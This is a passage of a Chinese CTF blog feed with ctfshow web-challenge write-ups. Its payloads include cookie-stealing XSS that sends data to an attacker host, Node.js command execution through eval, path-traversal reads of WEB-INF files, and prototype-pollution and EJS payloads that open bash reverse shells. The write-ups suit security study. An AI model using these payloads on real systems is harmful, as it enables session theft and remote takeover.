class="built_in">print</span>(flag) <span class="comment">#flag&#123;71542fcd-941e-4e10-b869-0181e9752356&#125;</span></span><br></pre></td></tr></table></figure><h2 id="网鼎杯-2020-半决赛-AliceWebsite"><a href="#网鼎杯-2020-半决赛-AliceWebsite" class="headerlink" title="[网鼎杯 2020 半决赛]AliceWebsite"></a>[网鼎杯 2020 半决赛]AliceWebsite</h2><p>下载源码发现存在文件包含，直接读</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?action=/flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow Web入门 刷题记录 3</title>
      <link href="/2023/06/01/ctfshow-web3/"/>
      <url>/2023/06/01/ctfshow-web3/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-Web入门刷题记录3"><a href="#ctfshow-Web入门刷题记录3" class="headerlink" title="ctfshow-Web入门刷题记录3"></a>ctfshow-Web入门刷题记录3</h1><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/rfrder/article/details/115218397">CTFshow-WEB入门-node.js</a></p><p><a href="https://xz.aliyun.com/t/7184">Node.js 常见漏洞学习与总结</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/111780832">CTFSHOW nodejs篇</a></p><p><a href="https://xz.aliyun.com/t/12053">关于Prototype Pollution Attack的二三事</a></p><p><a href="https://blog.csdn.net/qq_39101049/article/details/102501839">SSRF常见绕过思路</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/113866139">CTFshow-WEB入门-SSTI</a></p><p><a href="https://boogipop.com/2022/10/04/CTFSHOW-SSTI/">CTFSHOW-SSTI</a></p></blockquote><h1 id="java"><a href="#java" class="headerlink" title="java"></a>java</h1><h2 id="web279-297"><a href="#web279-297" class="headerlink" title="web279-297"></a>web279-297</h2><p>使用<a href="https://github.com/Vancomycin-g/Struts2Scan/">工具</a>即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python Struts2Scan.py -u http://069d45bf-4a11-4909-8faf-1a1afff8fd0b.challenge.ctf.show/S2-001/login.action</span><br><span class="line"></span><br><span class="line">python Struts2Scan.py -u http://069d45bf-4a11-4909-8faf-1a1afff8fd0b.challenge.ctf.show/S2-001/login.action -n S2-003 --exec</span><br></pre></td></tr></table></figure><p>根据提示<code>echo FLAG</code>易知flag在环境变量里，故执行<code>env</code>命令即可</p><blockquote><p>web295可以用里面的图形化工具（S2-048漏洞）</p></blockquote><h2 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h2><p>反汇编一下看看登陆的逻辑即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ctfshow/login?username=admin&amp;password=ctfshow</span><br></pre></td></tr></table></figure><h2 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h2><p>源码中发现</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- /view-source?file=index.php --&gt;</span></span><br></pre></td></tr></table></figure><p>进行文件读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/view-source?file=WEB-INF/web.xml</span><br><span class="line">发现com.ctfshow.servlet.GetFlag，去读该class文件</span><br><span class="line">/view-source?file=WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</span><br><span class="line">发现/fl3g，去读该文件即可获得flag</span><br><span class="line">/view-source?file=../../../../../fl3g</span><br></pre></td></tr></table></figure><h2 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h2><blockquote><p>有点逆天，一打开看见php还以为开错题了。。。</p></blockquote><p>跟上一题步骤一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=WEB-INF/web.xml</span><br><span class="line">/?file=WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</span><br><span class="line">/?file=../../../../../f1bg</span><br></pre></td></tr></table></figure><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>反射型<code>xss</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://your-ip:your-port/?p=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在自己的<code>vps</code>上开启监听即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server your-port</span><br></pre></td></tr></table></figure><p>也可以用<code>nc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvp your-port</span><br></pre></td></tr></table></figure><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>过滤了<code>script</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&#x27;http://your-ip:your-port/?p=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h2><p>在上一题基础上又过滤了<code>img</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.location.href=&#x27;http://your-ip:your-port/?p=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>过滤了空格，可以用<code>tab</code>键或者注释<code>\**\</code>代替，<code>web323</code>开始过滤了<code>iframe</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;body/**/onload=&quot;document.location.href=&#x27;http://your-ip:your-port/?p=&#x27;+document.cookie&quot;&gt;<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span><span class="attr">onload</span>=<span class="string">&quot;document.location.href=&#x27;http://your-ip:your-port/?p=&#x27;+document.cookie&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>存储型<code>xss</code>，记得收件人要写<code>admin</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;body/**/onload=&quot;document.location.href=&#x27;http://your-ip:your-port/?p=&#x27;+document.cookie&quot;&gt;<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>注册用户时在密码处插入<code>xss</code></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://your-ip:your-port/?p=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后拿到管理员的<code>session</code>，利用该<code>session</code>以<code>admin</code>身份去查看用户管理界面，最后在<code>/api/?page=1&amp;limit=10</code>页面可以得到<code>flag</code></p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>直接向<code>vps</code>发送网页源码即可，注册用户的密码如下</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;<span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://your-ip:your-port/?p=&#x27;</span>+value.<span class="property">innerHTML</span>;&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>在用户名处插入我们的<code>payload</code>，使得管理员修改自身密码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=evo1&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>过一段时间后用密码<code>evo1</code>登录<code>admin</code>即可，<code>flag</code>在用户管理界面的第一行欢迎语句处</p><h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><p>改用<code>post</code>修改密码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;evo1&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>用下面的<code>payload</code>作为用户名创建账户使得<code>admin</code>给用户<code>a</code>转账，然后购买<code>flag</code>即可</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;abc&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里注意下最好按照要求注册帐号（密码至少为6位），不然可能出现购买<code>flag</code>时，即使登录也显示未登录的情况</p></blockquote><h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>可以给自己转账，金额比自己余额小即可</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>用下面的<code>payload</code>作为用户名创建账户使得<code>admin</code>给用户<code>a</code>转账，然后购买<code>flag</code>即可</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">u</span>:<span class="string">&#x27;abc&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p>审计源码</p><p><code>user.js</code></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>login.js</code></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> users = <span class="built_in">require</span>(<span class="string">&#x27;../modules/user&#x27;</span>).<span class="property">items</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="title function_">findUser</span>(req.<span class="property">body</span>.<span class="property">username</span>, req.<span class="property">body</span>.<span class="property">password</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span>(user)&#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">regenerate</span>(<span class="keyword">function</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);        </span><br><span class="line">      &#125;</span><br><span class="line">       </span><br><span class="line">      req.<span class="property">session</span>.<span class="property">loginUser</span> = user.<span class="property">username</span>;</span><br><span class="line">      res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">0</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录成功&#x27;</span>,<span class="attr">ret_flag</span>:flag&#125;);              </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">1</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;账号或密码错误&#x27;</span>&#125;);</span><br><span class="line">  &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>关键点在这一句代码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password</span><br></pre></td></tr></table></figure><p>可以直接小写绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow/123456</span><br></pre></td></tr></table></figure><p>也可以用一下大小写漏洞</p><blockquote><p>在Character.toUpperCase()函数中，字符ı会转变为I，字符ſ会变为S。<br>在Character.toLowerCase()函数中，字符İ会转变为i，字符K会转变为k。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfſhow/123456</span><br></pre></td></tr></table></figure><h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>源码中发现提示<code>&lt;!-- /?eval= --&gt;</code>，直接命令执行即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).execSync(&#x27;cat fl00g.txt&#x27;).toString()</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://nodejs.cn/api/child_process.html#child_processexecsynccommand-options">child_process.execSync(command[, options])</a></p></blockquote><h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>上一题的<code>payload</code>被过滤了，换一个函数用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;).stdout.toString()</span><br><span class="line">/?eval=require(&#x27;child_process&#x27;).spawnSync(&#x27;cat&#x27;,[&#x27;fl001g.txt&#x27;]).stdout.toString()</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;).toString()</span><br></pre></td></tr></table></figure><p>另一个思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?eval=__filename</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>查看源码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>(); <span class="comment">/* GET home page. */</span> </span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123; </span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>); </span><br><span class="line">    <span class="keyword">var</span> evalstring = req.<span class="property">query</span>.<span class="property">eval</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">typeof</span>(evalstring)==<span class="string">&#x27;string&#x27;</span> &amp;&amp; evalstring.<span class="title function_">search</span>(<span class="regexp">/exec|load/i</span>)&gt;<span class="number">0</span>)&#123; </span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">title</span>: <span class="string">&#x27;tql&#x27;</span>&#125;); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="built_in">eval</span>(evalstring) &#125;); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;); </span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>直接用<code>fs</code>模块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?eval=require(&#x27;fs&#x27;).readdirSync(&#x27;.&#x27;)</span><br><span class="line">/?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>也可以用<code>+</code>拼接，但记得<code>url</code>编码一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?eval=require(&#x27;child_process&#x27;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;cat fl001g.txt&#x27;)</span><br></pre></td></tr></table></figure><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>给出了源码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>数组绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a[]=1&amp;b[]=1</span><br><span class="line">/?a[]=1&amp;b=1</span><br><span class="line">/?a[x]=1&amp;b[x]=1</span><br></pre></td></tr></table></figure><h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>关键点在<code>login.js</code>中的这一部分</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line"><span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>copy</code>函数源码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>原型链污染（记得使用<code>json</code>）</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;ctfshow&quot;</span><span class="punctuation">:</span><span class="string">&quot;36dboy&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p>在<code>login.js</code>中有</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>而<code>copy</code>函数在<code>common.js</code>中</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在<code>api.js</code>中有</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>所以先对<code>login</code>发包进行污染</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/your-ip/your-port 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后<code>POST</code>访问<code>api</code>即可反弹<code>shell</code>，<code>flag</code>在</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> | grep ctfshow</span><br></pre></td></tr></table></figure><p>因为该题使用的<code>ejs</code>是漏洞版本的，所以也可以</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/your-ip/your-port 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h2><p>这里与上题不太一样</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure><p>所以需要向上污染两次</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;query&quot;</span><span class="punctuation">:</span><span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/your-ip/your-port 0&gt;&amp;1\&quot;&#x27;)&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h2><p>打<code>ejs rce</code>，然后随便访问页面触发即可</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/your-ip/your-port 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><span class="punctuation">&#125;</span><span 